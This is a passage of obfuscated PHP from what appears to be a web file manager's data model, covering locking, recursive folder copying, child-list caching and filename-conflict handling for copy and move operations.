"\114\x45\106\124\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x69\157\137\x66\151\154\145\x20\x66\151\x6c\x65\x20\x6f\x6e\40\163\x6f\x75\162\x63\145\56\x66\x69\x6c\145\x49\104\x20\x3d\40\x66\151\x6c\x65\x2e\x66\151\154\x65\x49\x44"; $šŸÊ‚œÀ = $this->alias($§î•±ÍÀ[494])->field($ç´ÃÔà)->where($†ŞÜ¯¡)->join($¶¸€£«·)->select(); $this->_listAppendAuth($šŸÊ‚œÀ); $this->_listAppendUser($šŸÊ‚œÀ); $this->_listAppendPath($šŸÊ‚œÀ); $šŸÊ‚œÀ = array_to_keyvalue($šŸÊ‚œÀ, $§î•±ÍÀ[184]); $Ê¯×¨é… = "\57{$–Ü÷Õ”[$§î•±ÍÀ[32]]}\x2f"; $Ê¯×¨é… = $Ê¯×¨é… == $§î•±ÍÀ[568] ? $§î•±ÍÀ[8] : $Ê¯×¨é…; $Ş¸ó“ = array(); foreach ($šŸÊ‚œÀ as $Ğ›çÏŠ¬ => $Ê´øÏö¯) { $¶…”ˆª„ = $this->parentLevelArray($Ê´øÏö¯[$§î•±ÍÀ[560]]); array_shift($¶…”ˆª„); $ØÄì•ØÏ = $Ê¯×¨é…; for ($Şã¡èù = 0; $Şã¡èù < count($¶…”ˆª„); $Şã¡èù++) { $ØÄì•ØÏ .= $šŸÊ‚œÀ[$¶…”ˆª„[$Şã¡èù]][$§î•±ÍÀ[32]] . $§î•±ÍÀ[8]; } $ØÄì•ØÏ .= $Ê´øÏö¯[$§î•±ÍÀ[32]]; if ($Ê´øÏö¯[$§î•±ÍÀ[460]]) { $ØÄì•ØÏ .= $§î•±ÍÀ[8]; } $”Íç„”Á = array($§î•±ÍÀ[470] => str_replace($§î•±ÍÀ[568], $§î•±ÍÀ[8], str_replace($§î•±ÍÀ[568], $§î•±ÍÀ[8], str_replace($§î•±ÍÀ[568], $§î•±ÍÀ[8], $ØÄì•ØÏ))), $§î•±ÍÀ[591] => intval($Ê´øÏö¯[$§î•±ÍÀ[460]]), $§î•±ÍÀ[592] => intval($Ê´øÏö¯[$§î•±ÍÀ[79]]), $§î•±ÍÀ[88] => intval($Ê´øÏö¯[$§î•±ÍÀ[88]]), $§î•±ÍÀ[90] => $this->pathInfoFilter($Ê´øÏö¯)); if (!$”Íç„”Á[$§î•±ÍÀ[460]]) { $”Íç„”Á[$§î•±ÍÀ[516]] = $Ê´øÏö¯[$§î•±ÍÀ[516]]; } $Ş¸ó“[] = $”Íç„”Á; } $Ş¸ó“ = array_sort_by($Ş¸ó“, $§î•±ÍÀ[87]); return $Ş¸ó“; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($“°ÜŸÙè) { $®ãÄœÏ =& $_SERVER[³à¼î¯á]; if (!$this->allowLock()) { return; } $this->_lockCheck($®ãÄœÏ[593], $“°ÜŸÙè); $„Æ¡™‰Ñ = 1; $this->_lockEvent($“°ÜŸÙè, array($®ãÄœÏ[594], $®ãÄœÏ[595]), $„Æ¡™‰Ñ); $this->_lockParent($“°ÜŸÙè, array($®ãÄœÏ[595]), $„Æ¡™‰Ñ); $this->_lockEvent($“°ÜŸÙè, array($®ãÄœÏ[596], $®ãÄœÏ[597]), $„Æ¡™‰Ñ); $this->_lockCheckEnd($®ãÄœÏ[593], $“°ÜŸÙè); } public function lockCopyEnd($îù„¸Ø¡) { $Œ¿£æêà =& $_SERVER[³à¼î¯á]; if (!$this->allowLock()) { return; } $ÕÏ‡Ì—© = 0; $this->_lockEvent($îù„¸Ø¡, array($Œ¿£æêà[594], $Œ¿£æêà[595]), $ÕÏ‡Ì—©); $this->_lockParent($îù„¸Ø¡, array($Œ¿£æêà[595]), $ÕÏ‡Ì—©); $this->_lockEvent($îù„¸Ø¡, array($Œ¿£æêà[596], $Œ¿£æêà[597]), $ÕÏ‡Ì—©); } public function lockWriteStart($àç¨¿ËÍ, $òæÇ€ğ© = '') { $®ÉŒÌö× =& $_SERVER[³à¼î¯á]; if (!$this->allowLock()) { return; } $this->_lockCheck($®ÉŒÌö×[594], $àç¨¿ËÍ); $ç¦»ú¥Å = 1; $this->_lockKey($®ÉŒÌö×[598] . $àç¨¿ËÍ . $®ÉŒÌö×[10] . $òæÇ€ğ©, $ç¦»ú¥Å); $this->_lockEvent($àç¨¿ËÍ, array($®ÉŒÌö×[593], $®ÉŒÌö×[595]), $ç¦»ú¥Å); $this->_lockParent($àç¨¿ËÍ, array($®ÉŒÌö×[593], $®ÉŒÌö×[595]), $ç¦»ú¥Å); $this->_lockCheckEnd($®ÉŒÌö×[594], $àç¨¿ËÍ); } public function lockWriteEnd($à´òŸšÆ, $½üÙšÑ— = '') { $¤˜òÆ¦” =& $_SERVER[³à¼î¯á]; if (!$this->allowLock()) { return; } $ºöÏ—ŞÖ = 0; $this->_lockKey($¤˜òÆ¦”[598] . $à´òŸšÆ . $¤˜òÆ¦”[10] . $½üÙšÑ—, $ºöÏ—ŞÖ); $this->_lockEvent($à´òŸšÆ, array($¤˜òÆ¦”[593], $¤˜òÆ¦”[595]), $ºöÏ—ŞÖ); $this->_lockParent($à´òŸšÆ, array($¤˜òÆ¦”[593], $¤˜òÆ¦”[595]), $ºöÏ—ŞÖ); } public function lockMoveStart($ÖØœŸŞÀ) { $«€İÁüã =& $_SERVER[³à¼î¯á]; if (!$this->allowLock()) { return; } $this->_lockCheck($«€İÁüã[595], $ÖØœŸŞÀ); $’ó‘µË« = 1; $this->_lockKey($«€İÁüã[599] . $ÖØœŸŞÀ, $’ó‘µË«); $this->_lockEvent($ÖØœŸŞÀ, array($«€İÁüã[593], $«€İÁüã[594]), $’ó‘µË«); $this->_lockParent($ÖØœŸŞÀ, array($«€İÁüã[593], $«€İÁüã[595]), $’ó‘µË«); $this->_lockEvent($ÖØœŸŞÀ, array($«€İÁüã[600], $«€İÁüã[596], $«€İÁüã[597]), $’ó‘µË«); $this->_lockCheckEnd($«€İÁüã[595], $ÖØœŸŞÀ); } public function lockMoveEnd($Æ›ñí²Î) { $²€­ÌÌ… =& $_SERVER[³à¼î¯á]; if (!$this->allowLock()) { return; } $¶§ş‰şŸ = 0; $this->_lockKey($²€­ÌÌ…[599] . $Æ›ñí²Î, $¶§ş‰şŸ); $this->_lockEvent($Æ›ñí²Î, array($²€­ÌÌ…[593], $²€­ÌÌ…[594]), $¶§ş‰şŸ); $this->_lockParent($Æ›ñí²Î, array($²€­ÌÌ…[593], $²€­ÌÌ…[595]), $¶§ş‰şŸ); $this->_lockEvent($Æ›ñí²Î, array($²€­ÌÌ…[600], $²€­ÌÌ…[596], $²€­ÌÌ…[597]), $¶§ş‰şŸ); } private function _lockCheck($³•«¯à‹, $ıâÜ¨¹÷) { $Î³‹±ÄÈ =& $_SERVER[³à¼î¯á]; $ôûÜÓ²Â = $this->sourceInfo($ıâÜ¨¹÷); $İ«›ÓÈ¯ = $³•«¯à‹ . $Î³‹±ÄÈ[10] . $ıâÜ¨¹÷; $this->_lockTimeStart[$İ«›ÓÈ¯] = timeFloat(); if (!is_array($ôûÜÓ²Â)) { return; } $Œ®Ğ¢Î = LNG($Î³‹±ÄÈ[601]); CacheLock::setErrorMsg($Î³‹±ÄÈ[166] . htmlspecialchars($ôûÜÓ²Â[$Î³‹±ÄÈ[32]]) . $Î³‹±ÄÈ[168] . $Œ®Ğ¢Î); $this->_lockKey($İ«›ÓÈ¯, 1); $this->_lockKey($İ«›ÓÈ¯, 0); $Œ“À²¾í = array_reverse($this->parentLevelArray($ôûÜÓ²Â[$Î³‹±ÄÈ[560]])); foreach ($Œ“À²¾í as $ıÇ‘“íº) { $İ«›ÓÈ¯ = $³•«¯à‹ . $Î³‹±ÄÈ[602] . $ıÇ‘“íº; if (CacheLock::lockGet($Î³‹±ÄÈ[603] . $İ«›ÓÈ¯)) { $ôûÜÓ²Â = $this->sourceInfo($ıÇ‘“íº); CacheLock::setErrorMsg($Î³‹±ÄÈ[166] . htmlspecialchars($ôûÜÓ²Â[$Î³‹±ÄÈ[32]]) . $Î³‹±ÄÈ[168] . $Œ®Ğ¢Î); $this->_lockKey($İ«›ÓÈ¯, 1); $this->_lockKey($İ«›ÓÈ¯, 0); } } } private function _lockCheckEnd($é¯¿¬¹, $µòàÂ) { $¾¬õµÓ´ =& $_SERVER[³à¼î¯á]; $¿Œµ¨¶¬ = $é¯¿¬¹ . $¾¬õµÓ´[10] . $µòàÂ; CacheLock::setErrorMsg($¾¬õµÓ´[429]); if (!isset($this->_lockTimeStart[$¿Œµ¨¶¬])) { return; } $˜¶Ÿ¦º³ = timeFloat() - $this->_lockTimeStart[$¿Œµ¨¶¬]; unset($this->_lockTimeStart[$¿Œµ¨¶¬]); if ($˜¶Ÿ¦º³ > 0.5) { unset(self::$cacheSourceInfo[$¾¬õµÓ´[508] . $µòàÂ]); } $æå¯’ß¸ = $this->sourceInfo($µòàÂ); if (!$æå¯’ß¸) { show_json(LNG($¾¬õµÓ´[108]), !1); } } private function _lockParent($€·öÊî÷, $÷à¦”·§, $¶ı­¬•È) { if (!$this->autoLockSet) { return; } $ŠíÚş›À = $this->sourceInfo($€·öÊî÷); if (!is_array($ŠíÚş›À)) { return; } $ÄŞ¥ü†Õ = array_reverse($this->parentLevelArray($ŠíÚş›À[$_SERVER[³à¼î¯á][560]])); foreach ($ÄŞ¥ü†Õ as $§†•†„) { $this->_lockEvent($§†•†„, $÷à¦”·§, $¶ı­¬•È); } } private function _lockEvent($öÏ¹£Ä, $Ø›é‡¢î, $ıµ—…”©) { $Û£‹ê =& $_SERVER[³à¼î¯á]; if (!$this->autoLockSet) { return; } foreach ($Ø›é‡¢î as $À¾ÕºÖí) { $¬«Ü÷èº = $À¾ÕºÖí . $Û£‹ê[10] . $öÏ¹£Ä; if ($ıµ—…”© && CacheLock::lockGet($Û£‹ê[603] . $¬«Ü÷èº)) { continue; } $this->_lockKey($¬«Ü÷èº, $ıµ—…”©); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($äˆğŸã, $¥«“Ûû† = 1) { $ñ»óŒß = $_SERVER[³à¼î¯á][603] . md5($äˆğŸã); if ($¥«“Ûû†) { if (isset(self::$_lockItemArr[$ñ»óŒß])) { return; } self::$_lockItemArr[$ñ»óŒß] = 1; CacheLock::lock($ñ»óŒß, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ñ»óŒß])) { return; } unset(self::$_lockItemArr[$ñ»óŒß]); CacheLock::unlock($ñ»óŒß); } } public function isParentOf($ò‹®æØ­, $ ĞÒü“¥) { $ºåïş› =& $_SERVER[³à¼î¯á]; $¬©¢Ìîë = $this->sourceInfo($ò‹®æØ­); $Ş„¶íı“ = $this->sourceInfo($ ĞÒü“¥); $ÄÁÆˆÉ› = $¬©¢Ìîë[$ºåïş›[560]] . $¬©¢Ìîë[$ºåïş›[184]] . $ºåïş›[50]; $”³ÁäÍ = $Ş„¶íı“[$ºåïş›[560]] . $Ş„¶íı“[$ºåïş›[184]] . $ºåïş›[50]; $Û‚‰š·¿ = strpos($”³ÁäÍ, $ÄÁÆˆÉ›) === 0; return $Û‚‰š·¿; } private $targetIsDelete = 0; public function copy($¬ıœÃä, $Å™É‡‹¾, $„ÀÎ„¹ = REPEAT_REPLACE, $‡¾ª¦è‰ = '') { $ÊÉ­–Ğå =& $_SERVER[³à¼î¯á]; $Ù³×—á¬ = $this->sourceInfo($¬ıœÃä); $ŒéßôÀ = $this->sourceInfo($Å™É‡‹¾); if (!$Ù³×—á¬ || !$ŒéßôÀ || $ŒéßôÀ[$ÊÉ­–Ğå[460]] != $ÊÉ­–Ğå[91]) { return !1; } if ($this->isParentOf($¬ıœÃä, $Å™É‡‹¾)) { return !1; } $°ú×°”© = $‡¾ª¦è‰ ? $‡¾ª¦è‰ : $Ù³×—á¬[$ÊÉ­–Ğå[32]]; $this->lockCopyStart($¬ıœÃä); $this->lockWriteStart($Å™É‡‹¾, $°ú×°”©); $¡Ûá¼ˆÜ = array($ÊÉ­–Ğå[604] => array(), $ÊÉ­–Ğå[605] => array(), $ÊÉ­–Ğå[606] => array()); $this->targetIsDelete = intval($Ù³×—á¬[$ÊÉ­–Ğå[480]]); $¾’ÖÒ“… = $this->fileNameExistAuto($Å™É‡‹¾, $Ù³×—á¬); $‡×óëÍÄ = $this->_copy($¬ıœÃä, $Å™É‡‹¾, $„ÀÎ„¹, $¡Ûá¼ˆÜ, !0, $‡¾ª¦è‰); $this->_childrenListClear(); $this->lockCopyEnd($¬ıœÃä); $this->lockWriteEnd($Å™É‡‹¾, $°ú×°”©); if ($Ù³×—á¬[$ÊÉ­–Ğå[460]] == $ÊÉ­–Ğå[91] && $¾’ÖÒ“… == $‡×óëÍÄ) { $this->folderSizeResetChildren($¾’ÖÒ“…); } Model($ÊÉ­–Ğå[607])->addAll($¡Ûá¼ˆÜ[$ÊÉ­–Ğå[605]], array(), !0); if ($¾’ÖÒ“… != $‡×óëÍÄ || $Ù³×—á¬[$ÊÉ­–Ğå[460]] == $ÊÉ­–Ğå[91]) { Model($ÊÉ­–Ğå[608])->eventCopy($‡×óëÍÄ); } $this->saveAll($¡Ûá¼ˆÜ[$ÊÉ­–Ğå[606]]); Model($ÊÉ­–Ğå[221])->linkAdd($¡Ûá¼ˆÜ[$ÊÉ­–Ğå[604]]); $this->folderSizeReset($Å™É‡‹¾); $this->updateModifyTime($Å™É‡‹¾); return $‡×óëÍÄ; } private function _copy($àøãÎø, $¾¤¸Œ˜Š, $˜÷Ó”î›, &$ÛıÑ¼Îû, $íşòçˆ, $¨Ù’’Š = '') { $÷¦÷† =& $_SERVER[³à¼î¯á]; $ä„¢íñç = $this->sourceInfoCache($àøãÎø); $¤ïÏê„ = $ä„¢íñç[$÷¦÷†[460]] == $÷¦÷†[91]; $ºæ™äĞ = $¨Ù’’Š ? $¨Ù’’Š : $ä„¢íñç[$÷¦÷†[32]]; $ğ‡à¬æ¯ = $this->fileNameExistAuto($¾¤¸Œ˜Š, $ä„¢íñç); if ($íşòçˆ) { $this->_childrenAllMake($àøãÎø); if ($¤ïÏê„ && $ğ‡à¬æ¯) { $this->_childrenAllMake($ğ‡à¬æ¯); } } if (!$ğ‡à¬æ¯) { return $this->_copyCreate($àøãÎø, $¾¤¸Œ˜Š, $ºæ™äĞ, $ÛıÑ¼Îû); } $åæ²’Â = $ğ‡à¬æ¯; if ($¤ïÏê„) { if ($˜÷Ó”î› == REPEAT_RENAME_FOLDER) { $ºæ™äĞ = $this->fileNameAutoCache($¾¤¸Œ˜Š, $ºæ™äĞ, $˜÷Ó”î›, $¤ïÏê„); $åæ²’Â = $this->_copyCreate($àøãÎø, $¾¤¸Œ˜Š, $ºæ™äĞ, $ÛıÑ¼Îû); } else { $£òËïÉÑ = $this->_childrenList($àøãÎø); foreach ($£òËïÉÑ as $…Ö­ÄÓ¦) { $this->_copy($…Ö­ÄÓ¦[$÷¦÷†[184]], $ğ‡à¬æ¯, $˜÷Ó”î›, $ÛıÑ¼Îû, !1); } } } else { if ($˜÷Ó”î› == REPEAT_RENAME || $˜÷Ó”î› == REPEAT_RENAME_FOLDER) { $ºæ™äĞ = $this->fileNameAutoCache($¾¤¸Œ˜Š, $ºæ™äĞ, $˜÷Ó”î›, $¤ïÏê„); $åæ²’Â = $this->_copyCreate($àøãÎø, $¾¤¸Œ˜Š, $ºæ™äĞ, $ÛıÑ¼Îû); } else { if ($˜÷Ó”î› == REPEAT_REPLACE) { $ßÍïœüÜ = $this->sourceInfoCache($ğ‡à¬æ¯); $öÄíì» = $this->fileHistory($ßÍïœüÜ, $ä„¢íñç[$÷¦÷†[516]], $ä„¢íñç[$÷¦÷†[79]]); if ($öÄíì») { $ÛıÑ¼Îû[$÷¦÷†[604]][] = $ä„¢íñç[$÷¦÷†[516]]; } } else { if ($˜÷Ó”î› == REPEAT_SKIP) { } } } Hook::trigger($÷¦÷†[609], array($÷¦÷†[610], $ä„¢íñç, 0)); } return $åæ²’Â; } private function _copyCreate($¢¦ÒäÔí, $„ˆáÓ, $ƒÄí¸Õ¹, &$œÒ‹€áÃ) { $¿ùÊß” =& $_SERVER[³à¼î¯á]; $Óû¹µ×Ì = $this->sourceInfoCache($¢¦ÒäÔí); $öºã¤®Ï = $this->sourceInfoCache($„ˆáÓ); $ÛÚÆƒµ = $this->_makeItemData($Óû¹µ×Ì, $öºã¤®Ï, $ƒÄí¸Õ¹); Hook::trigger($¿ùÊß”[611], $ÛÚÆƒµ); Hook::trigger($¿ùÊß”[612], array($¿ùÊß”[613], $ÛÚÆƒµ, 0)); $øŞ°¾ÓÎ = $this->add($ÛÚÆƒµ); $Ó±çØÙ = array($¿ùÊß”[184] => $øŞ°¾ÓÎ, $¿ùÊß”[32] => $ƒÄí¸Õ¹); $this->_copyApplyMeta($Ó±çØÙ, $œÒ‹€áÃ); if ($Óû¹µ×Ì[$¿ùÊß”[460]] != $¿ùÊß”[91]) { $œÒ‹€áÃ[$¿ùÊß”[604]][] = $Óû¹µ×Ì[$¿ùÊß”[516]]; return $øŞ°¾ÓÎ; } $ºÇ™¶¬„ = array(); $ÓÛ¾«²Û = array(); $this->_childrenListAll($¢¦ÒäÔí, $ºÇ™¶¬„); $õõÛ’ğÙ = count($ºÇ™¶¬„); if ($õõÛ’ğÙ == 0) { return $øŞ°¾ÓÎ; } $±€Ñ¯ÀŞ = $this->sourceInfo($øŞ°¾ÓÎ); foreach ($ºÇ™¶¬„ as $Ø­›Ùˆ…) { $‘Â’Ï­º = $this->_makeItemData($Ø­›Ùˆ…, $±€Ñ¯ÀŞ, $Ø­›Ùˆ…[$¿ùÊß”[32]]); $‘Â’Ï­º[$¿ùÊß”[560]] = $Ø­›Ùˆ…[$¿ùÊß”[560]]; $ÓÛ¾«²Û[] = $‘Â’Ï­º; } $this->chunkEventSet($¿ùÊß”[614], array($¿ùÊß”[615], $ÛÚÆƒµ, $õõÛ’ğÙ)); $this->addAll($ÓÛ¾«²Û, array(), !1); $†ÖÚÑ»Ç = $this->where(array($¿ùÊß”[183] => $øŞ°¾ÓÎ))->select(); $±¼µÙ = $this->_childrenMakeRelation($ºÇ™¶¬„, $†ÖÚÑ»Ç); $±¼µÙ[$¢¦ÒäÔí] = $øŞ°¾ÓÎ; $¼Æ¾òÖ = array(); $¹óÕ‘Š£ = array(); foreach ($†ÖÚÑ»Ç as $Ø­›Ùˆ…) { $æÒ½È·‹ = $Ø­›Ùˆ…[$¿ùÊß”[184]]; $¹¼”¿í— = $this->_childrenMatch($±¼µÙ, $Ø­›Ùˆ…, $±€Ñ¯ÀŞ); $¼Æ¾òÖ[] = array($¿ùÊß”[184], $æÒ½È·‹, $¿ùÊß”[183], $¹¼”¿í—[$¿ùÊß”[183]]); $¹óÕ‘Š£[] = array($¿ùÊß”[184], $æÒ½È·‹, $¿ùÊß”[560], $¹¼”¿í—[$¿ùÊß”[560]]); $this->_copyApplyMeta($Ø­›Ùˆ…, $œÒ‹€áÃ); if ($Ø­›Ùˆ…[$¿ùÊß”[460]] != $¿ùÊß”[91]) { $œÒ‹€áÃ[$¿ùÊß”[604]][] = $Ø­›Ùˆ…[$¿ùÊß”[516]]; } } $this->chunkEventSet($¿ùÊß”[616], array($¿ùÊß”[617], $ÛÚÆƒµ, $õõÛ’ğÙ)); $this->saveAll($¼Æ¾òÖ); $this->chunkEventSet($¿ùÊß”[618], array($¿ùÊß”[619], $ÛÚÆƒµ, $õõÛ’ğÙ)); $this->saveAll($¹óÕ‘Š£); return $øŞ°¾ÓÎ; } private function _childrenMakeRelation($ü£ÄŸ£ï, $ôÉ†Š) { $ôë¥Çê± =& $_SERVER[³à¼î¯á]; $ó¿öŞƒè = array(); $şÎÓêØ– = array(); foreach ($ü£ÄŸ£ï as $³İ‰ÈØö) { $àÑ¤—Ş€ = $³İ‰ÈØö[$ôë¥Çê±[32]] . $ôë¥Çê±[8] . $³İ‰ÈØö[$ôë¥Çê±[560]]; $ó¿öŞƒè[$àÑ¤—Ş€] = $³İ‰ÈØö[$ôë¥Çê±[184]]; } foreach ($ôÉ†Š as $³İ‰ÈØö) { $àÑ¤—Ş€ = $³İ‰ÈØö[$ôë¥Çê±[32]] . $ôë¥Çê±[8] . $³İ‰ÈØö[$ôë¥Çê±[560]]; $Û·€Æ = $ó¿öŞƒè[$àÑ¤—Ş€]; $şÎÓêØ–[$Û·€Æ] = $³İ‰ÈØö[$ôë¥Çê±[184]]; } return $şÎÓêØ–; } private function _childrenMatch($Õê‚Æ¢¡, $…Ÿ”ëø, $ì“—×ş) { $—–ÔÛªÛ =& $_SERVER[³à¼î¯á]; $Øøæ¸»­ = $ì“—×ş[$—–ÔÛªÛ[560]]; $ÑË»¯ÖĞ = $this->parentLevelArray($…Ÿ”ëø[$—–ÔÛªÛ[560]]); foreach ($ÑË»¯ÖĞ as $šğÎéä·) { if (isset($Õê‚Æ¢¡[$šğÎéä·])) { $Øøæ¸»­ .= $Õê‚Æ¢¡[$šğÎéä·] . $—–ÔÛªÛ[620]; } } $Øøæ¸»­ = rtrim($Øøæ¸»­, $—–ÔÛªÛ[50]) . $—–ÔÛªÛ[50]; $Ëò­›şÈ = $this->parentLevelArray($Øøæ¸»­); $¯ÃêÁÀö = $Ëò­›şÈ[count($Ëò­›şÈ) - 1]; return array($—–ÔÛªÛ[183] => $¯ÃêÁÀö, $—–ÔÛªÛ[560] => $Øøæ¸»­); } private function _makeItemData($ÎØºÊã, $‚ä§Ì¾å, $”ŠÅ„) { $•…¼Ú¾© =& $_SERVER[³à¼î¯á]; $’èÊÁ÷Ë = array($•…¼Ú¾©[621] => $ÎØºÊã[$•…¼Ú¾©[460]], $•…¼Ú¾©[469] => $”ŠÅ„, $•…¼Ú¾©[622] => $ÎØºÊã[$•…¼Ú¾©[461]] ? $ÎØºÊã[$•…¼Ú¾©[461]] : $•…¼Ú¾©[12], $•…¼Ú¾©[517] => $ÎØºÊã[$•…¼Ú¾©[516]] ? $ÎØºÊã[$•…¼Ú¾©[516]] : 0, $•…¼Ú¾©[592] => $ÎØºÊã[$•…¼Ú¾©[79]] ? $ÎØºÊã[$•…¼Ú¾©[79]] : 0, $•…¼Ú¾©[623] => intval($‚ä§Ì¾å[$•…¼Ú¾©[181]]), $•…¼Ú¾©[624] => intval($‚ä§Ì¾å[$•…¼Ú¾©[545]]), $•…¼Ú¾©[625] => intval(USER_ID), $•…¼Ú¾©[626] => intval(USER_ID), $•…¼Ú¾©[452] => intval($‚ä§Ì¾å[$•…¼Ú¾©[184]]), $•…¼Ú¾©[627] => $‚ä§Ì¾å[$•…¼Ú¾©[560]] . $‚ä§Ì¾å[$•…¼Ú¾©[184]] . $•…¼Ú¾©[50], $•…¼Ú¾©[473] => $ÎØºÊã[$•…¼Ú¾©[88]] ? $ÎØºÊã[$•…¼Ú¾©[88]] : time(), $•…¼Ú¾©[479] => 0, $•…¼Ú¾©[628] => $•…¼Ú¾©[12]); return $’èÊÁ÷Ë; } private function _copyApplyMeta($›µ‘Ä™ş, &$‹ƒ·Ÿê») { $½»ûÚ‡÷ =& $_SERVER[³à¼î¯á]; $õúí¸ÛÌ = $›µ‘Ä™ş[$½»ûÚ‡÷[184]]; $¬Ú¿¾Ò = $›µ‘Ä™ş[$½»ûÚ‡÷[32]]; if (!isset($›µ‘Ä™ş[$½»ûÚ‡÷[629]]) || !$›µ‘Ä™ş[$½»ûÚ‡÷[629]] || $›µ‘Ä™ş[$½»ûÚ‡÷[629]] == $½»ûÚ‡÷[219]) { $‹ƒ·Ÿê»[$½»ûÚ‡÷[606]][] = array($½»ûÚ‡÷[184], $õúí¸ÛÌ, $½»ûÚ‡÷[629], short_id($õúí¸ÛÌ)); } if (Input::check($¬Ú¿¾Ò, $½»ûÚ‡÷[630])) { $‹ƒ·Ÿê»[$½»ûÚ‡÷[605]][] = array($½»ûÚ‡÷[184] => $õúí¸ÛÌ, $½»ûÚ‡÷[97] => $½»ûÚ‡÷[513], $½»ûÚ‡÷[425] => str_replace($½»ûÚ‡÷[53], $½»ûÚ‡÷[12], Pinyin::get($¬Ú¿¾Ò))); $‹ƒ·Ÿê»[$½»ûÚ‡÷[605]][] = array($½»ûÚ‡÷[184] => $õúí¸ÛÌ, $½»ûÚ‡÷[97] => $½»ûÚ‡÷[512], $½»ûÚ‡÷[425] => Pinyin::get($¬Ú¿¾Ò, $½»ûÚ‡÷[631])); } $‹ƒ·Ÿê»[$½»ûÚ‡÷[605]][] = array($½»ûÚ‡÷[184] => $õúí¸ÛÌ, $½»ûÚ‡÷[97] => $½»ûÚ‡÷[492], $½»ûÚ‡÷[425] => KodSort::makeStr($¬Ú¿¾Ò)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Òê¤Âå›) { $¬Ø‚°’Ÿ =& $_SERVER[³à¼î¯á]; $Ë­’ô’µ = $this->sourceInfo($Òê¤Âå›); $ÉğŸøúª = $¬Ø‚°’Ÿ[632]; $Ğ¾Ä„Ğï = array($¬Ø‚°’Ÿ[560] => array($¬Ø‚°’Ÿ[587], $Ë­’ô’µ[$¬Ø‚°’Ÿ[560]] . $Òê¤Âå› . $¬Ø‚°’Ÿ[588]), $¬Ø‚°’Ÿ[480] => $this->targetIsDelete); $¨ÎÖ–õ = $this->field($ÉğŸøúª)->where($Ğ¾Ä„Ğï)->select(); if (!$¨ÎÖ–õ) { return; } $¨ÎÖ–õ = array_to_keyvalue($¨ÎÖ–õ, $¬Ø‚°’Ÿ[184]); foreach ($¨ÎÖ–õ as $Õ¬Ú‘Ÿ) { $û¾ŞÇÓÑ = $Õ¬Ú‘Ÿ[$¬Ø‚°’Ÿ[183]]; $Òê¤Âå› = $Õ¬Ú‘Ÿ[$¬Ø‚°’Ÿ[184]]; if (!isset($this->_childrenListCache[$Òê¤Âå›]) && $Õ¬Ú‘Ÿ[$¬Ø‚°’Ÿ[460]] == $¬Ø‚°’Ÿ[91]) { $this->_childrenListCache[$Òê¤Âå›] = array(); } if (!isset($this->_childrenListCache[$û¾ŞÇÓÑ])) { $this->_childrenListCache[$û¾ŞÇÓÑ] = array(); } $this->_childrenListCache[$û¾ŞÇÓÑ][$Òê¤Âå›] = $Õ¬Ú‘Ÿ; $this->_childrenItemCache[$Òê¤Âå›] = $Õ¬Ú‘Ÿ; } } private function _childrenListAll($ì­…î³, &$Ñˆğ©´ë) { $Â™µÛ¼ =& $_SERVER[³à¼î¯á]; if (!isset($this->_childrenListCache[$ì­…î³])) { return; } $È ÈõÅé = $this->_childrenListCache[$ì­…î³]; foreach ($È ÈõÅé as $ö””Ÿá² => $Üä‡·İî) { $Ñˆğ©´ë[$ö””Ÿá²] = $Üä‡·İî; if ($Üä‡·İî[$Â™µÛ¼[460]] == $Â™µÛ¼[91]) { $this->_childrenListAll($ö””Ÿá², $Ñˆğ©´ë); } } } private function sourceInfoCache($¹ààšüğ) { if (isset($this->_childrenItemCache[$¹ààšüğ])) { return $this->_childrenItemCache[$¹ààšüğ]; } return $this->sourceInfo($¹ààšüğ); } private function _childrenList($ª»Ø™Ø¹) { if (isset($this->_childrenListCache[$ª»Ø™Ø¹])) { return $this->_childrenListCache[$ª»Ø™Ø¹]; } return $this->_childrenListSelect($ª»Ø™Ø¹); } private function _childrenListSelect($³éÑôÌ) { $àü­¨÷ =& $_SERVER[³à¼î¯á]; $—Ëªºü = array($àü­¨÷[183] => $³éÑôÌ, $àü­¨÷[480] => $this->targetIsDelete); $©ŒÚ•Ïì = $this->where($—Ëªºü)->select(); $©ŒÚ•Ïì = $©ŒÚ•Ïì ? $©ŒÚ•Ïì : array(); $ÎíÈ’Äã = array_to_keyvalue($©ŒÚ•Ïì, $àü­¨÷[184]); $this->_childrenListCache[$³éÑôÌ] = $ÎíÈ’Äã; foreach ($ÎíÈ’Äã as $³éÑôÌ => $ş¾èĞ«) { $this->_childrenItemCache[$³éÑôÌ] = $ş¾èĞ«; } return $ÎíÈ’Äã; } private function fileNameExistAuto($¥ÔÎ±µÈ, $¨§õúæË) { $õãÈ‘Ã =& $_SERVER[³à¼î¯á]; if ($¨§õúæË[$õãÈ‘Ã[480]] == $õãÈ‘Ã[91]) { return $this->fileNameExist($¥ÔÎ±µÈ, $¨§õúæË[$õãÈ‘Ã[32]]); } return $this->fileNameExistCache($¥ÔÎ±µÈ, $¨§õúæË[$õãÈ‘Ã[32]]); } private function fileNameExistCache($ÄÆàµ…î, $„»Ä€Æ‡) { $«Ÿ‡¶ïŞ =& $_SERVER[³à¼î¯á]; $„»Ä€Æ‡ = strtolower($„»Ä€Æ‡); $Ğ•¿é¤ = $this->_childrenList($ÄÆàµ…î); foreach ($Ğ•¿é¤ as $ğùÆìÑÍ) { if ($„»Ä€Æ‡ == strtolower($ğùÆìÑÍ[$«Ÿ‡¶ïŞ[32]])) { return $ğùÆìÑÍ[$«Ÿ‡¶ïŞ[184]]; } } return !1; } private function fileNameAutoCache($¸á§²‹», $‡Ğ¬Êºù, $Ä¡Æ¸É, $í©ş¦ğ‰) { $ŞÚõÊÈ« =& $_SERVER[³à¼î¯á]; $‚˜„Êâ® = $this->_childrenList($¸á§²‹»); $åûÀ£œÒ = array_to_keyvalue($‚˜„Êâ®, $ŞÚõÊÈ«[12], $ŞÚõÊÈ«[32]); return $this->fileNameAutoGet($åûÀ£œÒ, $‡Ğ¬Êºù, $Ä¡Æ¸É, $í©ş¦ğ‰); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($íïîçô©, $¹Ã¿óõì, $ß¿•ê½– = REPEAT_REPLACE, $ƒÓ¾‚Å = '') { 